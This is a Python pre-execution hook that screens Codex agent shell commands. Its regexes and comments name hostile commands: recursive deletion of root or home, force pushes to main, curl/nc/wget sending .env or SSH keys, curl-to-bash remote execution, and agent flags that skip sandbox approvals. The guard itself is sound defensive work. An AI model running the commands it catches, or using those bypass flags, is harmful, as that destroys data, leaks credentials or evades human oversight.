#!/usr/bin/env python3
"""danger_zone_guard.py -- Codex version of danger-zone-guard.

PreToolUse hook for Codex exec/shell tool calls. Catches catastrophic deletions,
force pushes to protected branches, and dangerous secret transmissions.

Codex protocol:
  - Allowed: print `{}` and exit 0
  - Blocked: print `{"decision": "block", "reason": "..."}` and exit 0

Everything above main() is a copy of hooks/danger-zone-guard/claude-code/
danger_zone_guard.py: installed hooks are flat files and may not import each
other, so the detection code is duplicated rather than shared. Change it there
and copy it here; tests/run-tests.py holds both builds to the same cases.
"""
import json
import re
import sys

# stdout and stderr take the locale codec too. Where that is not UTF-8, a hook
# blocks correctly and then dies with UnicodeEncodeError while printing its own
# message, so the user sees a traceback instead of the reason.
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8")
    except (AttributeError, ValueError):
        pass


# What a recursive `rm` must not be pointed at. A trailing `/` and `${HOME}` name
# the same places as `~` and `$HOME`; a trailing `/*` empties them all the same.
_HOME = r"(?:~|\$HOME|\$\{HOME\})"
_RM_TARGET = r"(?:/\*?|" + _HOME + r"(?:/\*?)?|/root|\.\.(?:/|\\|(?=\s|$|[;&|)])))"

# A command position: start of input or just after a separator. A real `(` or
# `$(` (one outside quotes) is turned into `;` before the deletion check, so a
# subshell starts a command too; a `(` in a commit message does not.
_CMD_POS = r"(?:^|[|;&\n]|&&|\|\|)\s*"
# Words that only change how the next command is started, so `sudo -E rm -rf /`
# deletes exactly what `rm -rf /` does. Every alternative starts with a distinct
# token, and each option has exactly one reading: an option letter that takes an
# argument (`sudo -u USER`) always takes the next word, and the bare-flag form
# never matches those letters alone. With both readings allowed, `sudo -u sudo
# -u ...` split two ways at every pair and backtracked exponentially.
# Wrapper words and their options sit on one line: a wrapper followed by a
# newline wraps nothing, and letting the blanks run over newlines made a run
# of `env` lines rescan to the end from every line start.
_WRAPPERS = (
    r"(?:\w+=[^\s;&|]*[^\S\n]+"
    r"|sudo(?:[^\S\n]+(?:-[ugCDhpr][^\S\n]+[^\s;&|]+|-(?![ugCDhpr](?![^\s;&|]))[^\s;&|]+))*[^\S\n]+"
    r"|doas(?:[^\S\n]+(?:-u[^\S\n]+[^\s;&|]+|-(?!u(?![^\s;&|]))[^\s;&|]+))*[^\S\n]+"
    r"|env(?:[^\S\n]+(?:-[uSCP][^\S\n]+[^\s;&|]+|-(?![uSCP](?![^\s;&|]))[^\s;&|]+))*[^\S\n]+"
    r"|(?:command|builtin|exec|nohup|time|nice|ionice|stdbuf)(?:[^\S\n]+-[^\s;&|]+)*[^\S\n]+"
    r"|xargs(?:[^\S\n]+-[^\s;&|]+)*[^\S\n]+"
    # `bash -c`, `bash -lc`, `bash -ec --`: options without `c`, then the one with it.
    r"|(?:ba|z|da|k)?sh(?:[^\S\n]+-(?![a-zA-Z]*c)[^\s;&|]+)*[^\S\n]+-[abd-zABD-Z]*c[a-zA-Z]*(?:[^\S\n]+--)?[^\S\n]+"
    r")*"
)
# `rm`, `\rm` (alias bypass), `/bin/rm`, `/usr/bin/rm`. Path segments are
# matched one at a time so a long token cannot be rescanned from every split.
_RM = r"\\?(?:(?:/[\w.-]+)*/)?rm"

# 1. Catastrophic recursive deletion.
# The prefix accepts a command position only -- start of input, or just after a
# separator -- so that `echo rm -rf /` (an argument, not a command) is not a
# match. An optional `sudo` may sit in between.
DANGEROUS_RM = re.compile(
    _CMD_POS + _WRAPPERS + r"("
    # In a flag word the first `r` (or `f`) is the one matched: letters before it
    # exclude it, so a long `-rrrr...` word has one parse instead of one per `r`.
    # The words matched are the same as `-[a-zA-Z]*r[a-zA-Z]*f?`.
    + _RM + r"\s+-[a-qs-zA-QS-Z]*r[a-zA-Z]*\s+" + _RM_TARGET +
    r"|" + _RM + r"\s+-[a-eg-zA-EG-Z]*f[a-zA-Z]*\s+" + _RM_TARGET +
    # Flags split over several words (`-r -f`) or spelled out (`--recursive`).
    r"|" + _RM + r"\s+(?=(?:-[^\s;&|]+\s+)*(?:-[a-qs-zA-QS-Z]*[rR][a-zA-Z]*|--recursive)\s)(?:-[^\s;&|]+\s+)+" + _RM_TARGET +
    # The target handed over on stdin: `echo / | xargs rm -rf`.
    r"|(?:echo|printf)\s+(?:-[^\s;&|]+\s+)*(?:/|/root|" + _HOME + r")/?\*?\s*\|\s*xargs(?:\s+-[^\s;&|]+)*\s+"
    + _RM + r"\s+(?:-[^\s;&|]+\s+)*-[a-qs-zA-QS-Z]*[rR][a-zA-Z]*"
    # PowerShell's `rm` / `del` / `rd` aliases on a drive root: `rm -r -fo C:\`.
    # The lookahead sits right after the command word, so it is tried once per
    # command, not once per split of the whitespace that follows.
    r"|(?:rm|del|erase|rd|rmdir)(?=[^\n;&|]*\s-r[a-z]*\b)[^\n;&|]*?\s[A-Za-z]:[\\/]\*?(?=\s|$|[;&|)])"
    r"|del\s+(?:/[a-zA-Z]+\s*)+\s*(?:[A-Za-z]:[\\/]|%USERPROFILE%|~|\.\.)"
    r"|rd\s+(?:/[a-zA-Z]+\s*)+\s*(?:[A-Za-z]:[\\/]|%USERPROFILE%|~|\.\.)"
    r"|rmdir\s+(?:/[a-zA-Z]+\s*)+\s*(?:[A-Za-z]:[\\/]|%USERPROFILE%|~|\.\.)"
    # `.git` ends at a blank, a separator or the end; the blank itself is left
    # for the closing check below, so `rm -rf .git foo` matches like `rm -rf .git`.
    r"|" + _RM + r"\s+-[a-qs-zA-QS-Z]*r[a-zA-Z]*\s+.*\.git(?:/|(?=\s|$|[;&|)]))"
    # `(?=(?P<x>...))(?P=x)` takes the whole switch run once and never gives part
    # of it back (an atomic group that also works before Python 3.11), so a long
    # run of `/s /s /s` is not re-split before the `.*`, which can take anything
    # a shorter split would have left.
    r"|rd\s+(?=(?P<rd_git_sw>(?:/[a-zA-Z]+\s*)+))(?P=rd_git_sw).*\.git(?:\\|(?=\s|$|[;&|)]))"
    r"|(?:Remove-Item|ri)\s+(?=[^\n;&|]*(?:-Recurse|-r\b))[^\n;&|]*(?:[A-Za-z]:[\\/]\*?(?=\s|$|[;&|)])|~|\$HOME|\$env:USERPROFILE|\.\.(?:[\\/]|(?=\s|$|[;&|)]))|\.git(?:[\\/]|(?=\s|$|[;&|)])))"
    r"|(?:Format-Volume|Clear-Disk)\b[^\n;&|]*"
    r")(?:\s|$|[;&|)])",
    re.IGNORECASE,
)

# 2. Dangerous Git force push to main / master
# The segment of one `git push` command: from `push` to the next separator.
# Options git takes before the subcommand (`git -C repo push`) are skipped.
# Linear-time: an option-looking token after `-C` is never taken as its value, so
# `-C -C -C ...` has one parse (it used to have exponentially many).
_GIT_OPT = r"--?[A-Za-z][\w-]*(?:=\S+)?"
_GIT_PREFIX = (
    r"\bgit\s+(?:(?:-[Cc]\s+(?:\"\s*\"|'\s*'|(?!" + _GIT_OPT + r"\s)\S+)|" + _GIT_OPT + r")\s+)*"
)
GIT_PUSH = re.compile(_GIT_PREFIX + r"push\b([^;&|\n]*)", re.IGNORECASE)
# The same `git` and options without the subcommand: how far an attempt reads.
GIT_PREFIX = re.compile(_GIT_PREFIX, re.IGNORECASE)
GIT_WORD = re.compile(r"\bgit\s", re.IGNORECASE)
PROTECTED_BRANCHES = frozenset({"main", "master", "prod", "production", "release"})
# `release/1.2` and `release-1.2` are protected like `release`; `feature/release-notes` is not
# (the whole branch name is matched, not a substring).
PROTECTED_RELEASE = re.compile(r"release[/-][\w./-]*$", re.IGNORECASE)

# 3. Secret / credential exfiltration patterns
# Escape hatch for the force-push rule only, mirroring fork_pr_guard's
# `# upstream-ok:`. A force push to main is sometimes the operation that was
# actually ordered -- squashing a repo's history, for one -- and a guard with no
# way through invites the far worse habit of routing around it (`git push
# origin +main`, or the REST refs API, neither of which this regex sees).
#
# The marker demands a written reason, so the intent is recorded in the command
# itself, and it is read from the *unblanked* command: it is a comment, and
# blank_quoted would erase it if the reason were quoted. It deliberately does
# not cover the deletion or exfiltration rules -- there is no legitimate
# `rm -rf /`.
FORCE_PUSH_OK = re.compile(r"#\s*force-push-ok:\s*\S", re.IGNORECASE)

_SECRET = r"(?:\.env|id_rsa|id_ed25519|credentials\.json|oauth_creds\.json)"
_SEG = r"[^\n;&|]*"  # the rest of one command: up to the next real separator
# Each tool that can send a file: (the word that starts it, the whole send).
# Matched per command, from the first occurrence of the word only: a later
# occurrence could only match what the first one already reaches, and starting
# from every occurrence made a run of `curl curl curl ...` quadratic.
SECRET_EXFIL = tuple(
    (re.compile(word, re.IGNORECASE), re.compile(send, re.IGNORECASE))
    for word, send in (
        # `-d@.env` (no space), `-F file=@.env` (multipart field), `@./.env`.
        (r"\bcurl\s", r"curl\s" + _SEG + r"?(?:-d|--data(?:-\w+)?|-F|--form|-T|--upload-file)"
                      r"\s*(?:[@'\"]?|\w+=[@<])(?:\./)?" + _SECRET + r"\b"),
        (r"\bnc\s", r"nc\s" + _SEG + r"?<\s*(?:\./)?(?:\.env|id_rsa|id_ed25519|oauth_creds\.json)\b"),
        (r"\bwget\s", r"wget\s(?:[^\n;&|-]|-(?!-post-))*--post-(?:file|data)=" + _SEG
                      + r"?(?:\.env|id_rsa|oauth_creds\.json)\b"),
        (r"\b(?:Invoke-RestMethod|irm|Invoke-WebRequest|iwr)\s",
         r"(?:Invoke-RestMethod|irm|Invoke-WebRequest|iwr)\s" + _SEG
         + r"?(?:-InFile|-Body)\s+[@'\"]?" + _SECRET + r"\b"),
    )
)
# The same sends read across a whole line of the quote-blanked text, the way the
# earlier single regex (`curl\s+.*-d ...`) read them. It also catches lines like
# `curl -X POST https://h?a=1&b=2 -d @.env`, where an unquoted `&` splits the
# command; keeping it means no line blocked before is let through now.
SECRET_EXFIL_LINE = tuple(
    (word, re.compile(
        # The tool word may be followed by any blanks, newlines included (`curl\n-d`).
        re.sub(r"^(\(\?:[^)]*\)|\w+)\\s", r"\1\\s+", send.pattern)
        .replace(_SEG, r"[^\n]*").replace(r"[^\n;&|-]", r"[^\n-]"),
        re.IGNORECASE))
    for word, send in SECRET_EXFIL
)
_LEADING_WRAPPERS = re.compile(r"\s*" + _WRAPPERS, re.IGNORECASE)
_WRAPPER_SPAN = 512
_REAL_SEPARATOR = re.compile(r"[\n;&|]")

# 4. Remote script pipe-to-shell RCE and nested agent sandbox/permission bypass
# Read one pipeline stage at a time: a stage that downloads, piped straight into
# a stage that runs a shell. (One regex over the whole command rescanned the
# rest of the stage from every `curl`, so a long run of them stalled the hook.)
_DOWNLOADERS = (
    (re.compile(r"\b(?:curl|wget)\b", re.IGNORECASE),
     re.compile(r"\s*(?:sudo\s+)?(?:bash|sh|zsh|pwsh|powershell|python\d*(?:\.\d+)?|node)\b",
                re.IGNORECASE)),
    (re.compile(r"\b(?:iwr|Invoke-WebRequest|irm|Invoke-RestMethod)\b", re.IGNORECASE),
     re.compile(r"\s*(?:iex|Invoke-Expression)\b", re.IGNORECASE)),
)
# `||` and `&&` end a command; a single `|` joins two stages of one pipeline.
_COMMAND_END = re.compile(r"\|\||&&|[;&\n]")
_PIPE_CONTINUATION = re.compile(r"(?<!\|)\|\s*\n\s*")  # blank lines after `|` too
REMOTE_INVOKE_EXEC = re.compile(
    r"\b(?:iex|Invoke-Expression)\s*\(\s*(?:iwr|Invoke-WebRequest|irm|Invoke-RestMethod)\b",
    re.IGNORECASE,
)


def find_pipe_exec(as_commands):
    """`curl ... | bash` and its kin, as text, or None."""
    # A line ending in `|` continues the pipeline on the next line.
    joined = _PIPE_CONTINUATION.sub("| ", as_commands)
    for command in _COMMAND_END.split(joined):
        stages = command.split("|")
        for stage, following in zip(stages, stages[1:]):
            for download, shell in _DOWNLOADERS:
                fetch = download.search(stage)
                run = fetch and shell.match(following)
                if run:
                    return "%s|%s" % (stage[fetch.start():].rstrip(), run.group(0))
    invoke = REMOTE_INVOKE_EXEC.search(as_commands)
    return invoke.group(0) if invoke else None

# A downloaded script run without a pipe: `bash <(curl ...)`, `bash -c "$(curl ...)"`,
# `source <(curl ...)`. Matched on flatten_quoted() text (quotes dropped, every
# separator left in it is a real one), at a command position.
REMOTE_SUBST_EXEC = re.compile(
    r"(?:^|[|;&\n])\s*" + _WRAPPERS
    # The shell's options end at a blank or a separator: `sh -e;echo $(curl x)`
    # runs the download in `echo`, and reading past the `;` was also quadratic.
    + r"(?:(?:ba|z|da|k)?sh|source|\.)(?:[^\S\n]+-[^\s;&|]+)*?[^\S\n]+(?:\$\s*\(|<\s*\()\s*(?:curl|wget)\b",
    re.IGNORECASE,
)

_BYPASS_FLAG = (
    r"(?:--dangerously-bypass-approvals-and-sandbox|--dangerously-skip-permissions|--yolo"
    r"|--permission-mode(?:=|\s+)bypassPermissions)\b"
)
SANDBOX_BYPASS_EXEC = re.compile(
    r"(?:^|[|;&\n]|&&|\|\|)\s*" + _WRAPPERS
    + r"(?:claude|codex|gemini|agy|npx)\b[^;&|\n]*?" + _BYPASS_FLAG,
    re.IGNORECASE,
)
# The earlier rule allowed `A=value` words before the CLI whose value may run
# past a `;` (`A=x;y claude --dangerously-skip-permissions`), and a regex doing
# that rescanned the rest of the input from every separator. The same rule is
# checked here backwards from each CLI word that has a bypass flag after it in
# its own command, which is linear.
AGENT_CLI_WORD = re.compile(r"(?:claude|codex|gemini|agy|npx)\b", re.IGNORECASE)
BYPASS_FLAG = re.compile(_BYPASS_FLAG, re.IGNORECASE)
_ASSIGNMENT_HEAD = re.compile(r"\w+=")
_SUDO = re.compile(r"sudo", re.IGNORECASE)
_SEPARATOR_CHARS = "|;&\n"


def _prefix_element(token, i, allow_sudo):
    """Is token[i:] one word of the earlier prefix: `sudo`, or `name=anything`?"""
    # The same case folding the earlier regex used (IGNORECASE also folds `ſ`
    # to `s`, which str.lower() does not).
    if allow_sudo and len(token) - i == 4 and _SUDO.fullmatch(token, i):
        return True
    return bool(_ASSIGNMENT_HEAD.match(token, i))


def _earlier_prefix_reaches(text, p, memo):
    """Could `(?:^|[|;&\\n]|&&|\\|\\|)\\s*(?:\\w+=\\S*\\s+)*(?:sudo\\s+)?` end at p?

    Walks back one blank-separated word at a time. A word may itself contain a
    separator (an assignment value can), so the prefix may also start right
    after any separator inside the word. Past the first word only assignments
    are allowed, so the answer from a given word boundary is always the same:
    `memo` keeps it, and later walks stop there instead of re-reading the same
    run of `name=` words (every CLI word used to walk the whole run again).
    """
    allow_sudo = True
    end = p
    visited = []

    def done(result):
        for position in visited:
            memo[position] = result
        return result

    while True:
        if not allow_sudo:
            if end in memo:
                return done(memo[end])
            visited.append(end)
        start = end
        while start > 0 and text[start - 1].isspace():
            start -= 1
        if start == 0 or "\n" in text[start:end] or text[start - 1] in _SEPARATOR_CHARS:
            return done(True)
        if start == end:
            return done(False)
        word_start = start
        while word_start > 0 and not text[word_start - 1].isspace():
            word_start -= 1
        word = text[word_start:start]
        for i, ch in enumerate(word):
            if ch in _SEPARATOR_CHARS and _prefix_element(word, i + 1, allow_sudo):
                return done(True)
        if not _prefix_element(word, 0, allow_sudo):
            return done(False)
        allow_sudo = False
        end = word_start


def find_sandbox_bypass(as_commands):
    # Both checks below run only on commands that hold a bypass flag, and the
    # wrapper regex only up to that command's last flag: there, any CLI word it
    # reaches has a flag after it in the same command, so it cannot fail and
    # retry. Run over the whole text, a run of `agy= ` words (CLI-named
    # assignments, no flag) made it retry from every one.
    # Work on the text as it is: a flag found by BYPASS_FLAG may span a newline
    # (`--permission-mode\nbypassPermissions`), so a separator inside a flag does
    # not end the command, but every other newline keeps its meaning for the
    # backward walk.
    text = as_commands
    flags = list(BYPASS_FLAG.finditer(text))
    if not flags:
        return None
    ends = []
    k = 0
    for sep in re.finditer(r"[|;&\n]", text):
        while k < len(flags) and flags[k].end() <= sep.start():
            k += 1
        if k < len(flags) and flags[k].start() <= sep.start():
            continue
        ends.append(sep.start())
    ends.append(len(text))
    start = 0
    k = 0
    memo = {}
    for end in ends:
        while k < len(flags) and flags[k].start() < start:
            k += 1
        last = None
        while k < len(flags) and flags[k].start() < end:
            last = flags[k]
            k += 1
        if last is not None:
            match = SANDBOX_BYPASS_EXEC.search(text, max(start - 1, 0), last.end())
            if match:
                return match.group(0)
            for word in AGENT_CLI_WORD.finditer(text, start, last.start()):
                if _earlier_prefix_reaches(text, word.start(), memo):
                    return text[word.start():last.end()]
        start = end + 1
    return None

HEREDOC = re.compile(r"(?<!<)<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1")

def read_payload():
    """Read the hook payload as bytes and decode UTF-8 explicitly.

    `json.load(sys.stdin)` decodes using whatever encoding the locale hands the
    process. Where that is not UTF-8 -- the default on a Chinese, Japanese, or
    Korean Windows install -- any non-ASCII text in the payload is mangled, the
    JSON fails to parse, and the hook fails open. Silently, and precisely when
    the message or the command is not in English.

    Observed in service on 2026-08-15: a 2.3 KB Stop payload parsed as an empty
    object, so claim-evidence-guard saw no assistant message and let the turn
    end. Reading bytes removes the dependency on the ambient locale entirely.
    """
    raw = sys.stdin.buffer.read()
    if not raw.strip():
        return {}
    return json.loads(raw.decode("utf-8", "replace"))


UNBOUNDED_RETRY = re.compile(
    r"(?:(?:^|[|;&\n])\s*while\s+(?:true|:)\s*[;\n]"
    r"|(?:^|[|;&\n])\s*for\s*\(\(\s*;\s*;\s*\)\)"
    r"|(?:^|[|;&\n])\s*while\s*\(\s*\$true\s*\)"
    r"|(?:^|[|;&\n])\s*for\s*\(\s*;\s*;\s*\))",
    re.IGNORECASE,
)
BOUNDED_LOOP_OK = re.compile(r"#\s*bounded-loop-ok:\s*\S", re.IGNORECASE)


def blank_heredocs(command):
    """Blank out heredoc bodies. Their contents are data being written."""
    chars = list(command)
    pos = 0
    while True:
        match = HEREDOC.search(command, pos)
        if not match:
            break
        delimiter = match.group(2)
        body_start = command.find("\n", match.end())
        if body_start == -1:
            break
        end_match = re.compile(
            # Any blank except a newline (`\r` for CRLF, Unicode spaces as before):
            # `\s*` also took newlines, so a run of blank lines in an open heredoc
            # was rescanned from every line start and stalled the hook.
            r"^[^\S\n]*" + re.escape(delimiter) + r"[^\S\n]*$", re.MULTILINE
        ).search(command, body_start)
        body_end = end_match.start() if end_match else len(command)
        for i in range(body_start, body_end):
            if chars[i] != "\n":
                chars[i] = " "
        # A marker inside the body is data, so the search resumes after it.
        pos = max(match.end(), body_end)

    return "".join(chars)


def blank_quoted(command):
    """Blank out quoted spans. Used where quoted text really is text."""
    out = list(command)
    quote = None
    for i, ch in enumerate(command):
        if quote is None:
            if ch in "'\"":
                quote = ch
        elif ch == quote:
            quote = None
        else:
            out[i] = " "
    return "".join(out)


def unquote(command):
    """Drop quote characters, keeping what they wrapped.

    `rm -rf "$HOME"` and `rm -rf $HOME` delete the same thing, so the deletion
    check has to see through the quotes. Two characters must never be enough to
    walk past this guard.
    """
    return command.replace('"', " ").replace("'", " ")


def _git_push_matches(as_commands):
    """The `git ... push ...` matches GIT_PUSH.finditer would give, in linear time.

    finditer retries from every `git`, and in `git -C git -C git ...` each retry
    rereads the rest of the run. A `git` that a failed attempt read as an option
    value ends its own attempt at the same place, so it can be skipped.
    """
    pos = 0
    while True:
        word = GIT_WORD.search(as_commands, pos)
        if not word:
            return
        match = GIT_PUSH.match(as_commands, word.start())
        if match:
            yield match
            pos = max(match.end(), word.end())
        else:
            pos = max(GIT_PREFIX.match(as_commands, word.start()).end(), word.end())


def find_force_push(without_heredocs, as_commands):
    """Return the text of a force push to a protected branch, or None.

    The push segments are located in `as_commands` (quoted text blanked, so a
    commit message that mentions a force push is not one). Their arguments are
    then read from the same span of the unblanked text with the quote characters
    dropped, because `git push --force origin "main"` pushes exactly as much as
    the unquoted form. Flag and branch may come in either order.
    """
    for match in _git_push_matches(as_commands):
        start, end = match.span(1)
        tokens = without_heredocs[start:end].replace('"', " ").replace("'", " ").split()
        forced = False
        protected = False
        for token in tokens:
            if token.startswith("--"):
                forced = forced or token.lower().startswith("--force")
            elif token.startswith("-"):
                forced = forced or "f" in token[1:].lower()
            else:
                if token.startswith("+"):
                    forced = True
                    token = token[1:]
                branch = token.split(":")[-1]
                if branch.startswith("refs/heads/"):
                    branch = branch[len("refs/heads/"):]
                protected = protected or branch.lower() in PROTECTED_BRANCHES or bool(PROTECTED_RELEASE.match(branch))
        if forced and protected:
            return match.group(0).strip()
    return None


def flatten_quoted(command):
    """Drop quote characters, and blank the separators that sit inside quotes.

    What is left reads like the command the shell runs, and every `;`, `&`,
    `|`, newline or parenthesis still in it is a real separator. One exception
    keeps its meaning inside double quotes: `"$(...)"` still runs its command,
    so `$(` stays there; inside single quotes it is text and is blanked.
    Positions are kept, like blank_quoted and unquote.
    """
    out = list(command)
    quote = None
    for i, ch in enumerate(command):
        if quote is None:
            if ch in "'\"":
                quote = ch
                out[i] = " "
        elif ch == quote:
            quote = None
            out[i] = " "
        elif ch in ";&|\n()$":
            substitution = quote == '"' and (
                (ch == "$" and command[i + 1:i + 2] == "(")
                or (ch == "(" and i > 0 and command[i - 1] == "$"))
            if not substitution:
                out[i] = " "
    return "".join(out)


def find_exfil(as_commands, flat):
    """The text of a secret file being sent, or None.

    Looked for one command at a time. In the quote-blanked text the sending tool
    may sit anywhere in the command (`x | curl -d @.env h`); in the flattened text
    (quotes dropped, so `curl -d '@.env'` counts) it must be the command itself,
    so a commit message that mentions one is not read as one.
    """
    # Per line, from the first tool word of the line; the match itself may run
    # on past the newline where the pattern allows a blank (`curl -d\n@.env`).
    line_start = 0
    while line_start <= len(as_commands):
        line_end = as_commands.find("\n", line_start)
        line_end = len(as_commands) if line_end == -1 else line_end
        for word, send in SECRET_EXFIL_LINE:
            # The first word of the line reaches everything later on the line;
            # only the last one can reach past the newline (`curl x curl\n-d ...`).
            found = list(word.finditer(as_commands, line_start, line_end + 1))
            match = None
            for occurrence in (found[:1] + found[-1:]) if found else ():
                match = send.match(as_commands, occurrence.start())
                if match:
                    break
            if match:
                return match.group(0)
        line_start = line_end + 1
    start = 0
    for end in [m.start() for m in _REAL_SEPARATOR.finditer(flat)] + [len(flat)]:
        blanked = as_commands[start:end]
        plain = flat[start:end]
        # Where a command starts: the segment itself and every `(` / `$(` group
        # in it, past any wrapper words. Each tool is matched once, from the first
        # of these that begins with it; a later one reaches nothing the first
        # does not, since `(` does not end the match.
        # Wrapper words are read at most _WRAPPER_SPAN characters past each head,
        # so many `(` in one command cannot each rescan the rest of it.
        leads = [_LEADING_WRAPPERS.match(plain, head, min(len(plain), head + _WRAPPER_SPAN)).end()
                 for head in [0] + [i + 1 for i, ch in enumerate(plain) if ch == "("]]
        for word, send in SECRET_EXFIL:
            first = word.search(blanked)
            match = first and send.match(blanked, first.start())
            if not match:
                lead = next((lead for lead in leads if word.match(plain, lead)), None)
                match = lead is not None and send.match(plain, lead)
            if match:
                return match.group(0)
        start = end + 1
    return None


# A run of three or more blanks is cut to two: two spaces, or a newline and a
# space, or two newlines when it held more than one. The patterns allow `\s+`
# in many places; a long run could otherwise be split in many ways and stall
# the hook past its timeout, and a hook that times out lets the command
# through. Two are kept because some rules read one blank as the end of a word
# and the next as the separator after it.
_BLANK_RUN = re.compile(r"\s{3,}")

# A hook that runs past its timeout lets the command through, so a command
# longer than this guard can promise to inspect in time is refused instead.
# Heredoc bodies are blanked and blank runs shortened before measuring, so a
# long file written through a heredoc still passes. Every slow pattern review
# found was fixed as well; this is the backstop for the ones not yet found.
MAX_INSPECT_CHARS = 50000


def _shorten_blanks(match):
    newlines = match.group(0).count("\n")
    return "  " if newlines == 0 else ("\n " if newlines == 1 else "\n\n")


def inspect_command(command, repo_root=None):
    """Check command against dangerous patterns. Returns reason string or None."""
    without_heredocs = _BLANK_RUN.sub(_shorten_blanks, blank_heredocs(command))
    if len(without_heredocs) > MAX_INSPECT_CHARS:
        return (
            "Command too long to inspect safely (%d characters after heredoc bodies; "
            "limit %d). Put it in a script file and run the file instead."
            % (len(without_heredocs), MAX_INSPECT_CHARS)
        )

    flat = flatten_quoted(without_heredocs)
    for_rm = list(unquote(without_heredocs))
    for i, ch in enumerate(flat):
        if ch in "()":
            for_rm[i] = ";"
            if ch == "(" and i and flat[i - 1] == "$":
                for_rm[i - 1] = " "
    # Dropping quotes turns `\n''\n''...` into one long blank run again, so the
    # blank runs are shortened once more before these command-position rules.
    rm_match = DANGEROUS_RM.search(_BLANK_RUN.sub(_shorten_blanks, "".join(for_rm)))
    if rm_match:
        return "Catastrophic file/directory deletion or .git removal (`%s`)" % rm_match.group(0).strip()

    as_commands = blank_quoted(without_heredocs)

    force_push = find_force_push(without_heredocs, as_commands)
    if force_push and not FORCE_PUSH_OK.search(command):
        return (
            "Forced push to protected branch (`%s`). When the force push is the "
            "operation that was actually asked for, state that in the command "
            "with `# force-push-ok: <reason>`." % force_push
        )

    # Quotes dropped, not blanked: `curl -d '@.env'` sends the same file as the
    # unquoted form.
    exfil = find_exfil(as_commands, flat)
    if exfil:
        return "Potential credential/secret transmission (`%s`)" % exfil.strip()

    subst = REMOTE_SUBST_EXEC.search(_BLANK_RUN.sub(_shorten_blanks, flat))
    pipe = find_pipe_exec(as_commands) or (subst and subst.group(0))
    if pipe:
        return "Remote script pipe-to-shell execution (`%s`). Download and inspect the script before running." % pipe.strip()

    bypass = find_sandbox_bypass(as_commands)
    if bypass:
        return "Agent sandbox/approval bypass flag (`%s`) is forbidden." % bypass.strip()

    retry_match = UNBOUNDED_RETRY.search(as_commands)
    if retry_match and not BOUNDED_LOOP_OK.search(command):
        return "Unbounded retry / infinite loop construct detected (`%s`). Under loop-policy, iterations must be bounded." % retry_match.group(0).strip()

    return None


def main():
    try:
        payload = read_payload()
    except (json.JSONDecodeError, ValueError, UnicodeDecodeError):
        sys.stdout.write("{}\n")
        return 0

    tool_name = payload.get("tool_name") or ""
    if tool_name not in ("exec", "shell", "exec_command", "Bash", "Exec"):
        sys.stdout.write("{}\n")
        return 0

    tool_input = payload.get("tool_input") or {}
    command = (
        tool_input.get("command")
        or tool_input.get("cmd")
        or tool_input.get("CommandLine")
        or ""
    )
    if not command:
        sys.stdout.write("{}\n")
        return 0

    reason = inspect_command(command)
    if reason:
        msg = (
            "DANGER ZONE GUARD: Potentially destructive or unsafe command blocked: "
            "%s. (Command: %s)" % (reason, command.strip()[:160])
        )
        sys.stdout.write(json.dumps({"decision": "block", "reason": msg}, ensure_ascii=False))
        return 0

    sys.stdout.write("{}\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
